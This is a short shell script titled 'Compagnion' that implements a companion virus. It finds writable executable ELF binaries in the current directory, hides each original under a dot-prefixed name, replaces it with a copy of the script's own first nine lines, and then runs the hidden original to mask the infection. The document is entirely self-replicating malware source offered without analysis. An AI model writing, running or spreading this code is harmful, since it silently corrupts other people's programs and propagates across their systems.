# Compagnion
 for file in * ;  do
   if test -f $file && test -x $file && test -w $file ; then
    if file $file | grep -s 'ELF' > /dev/nul ; then
     mv $file .$file
     head -n 9 $0 > $file
  fi; fi
 done
 .$0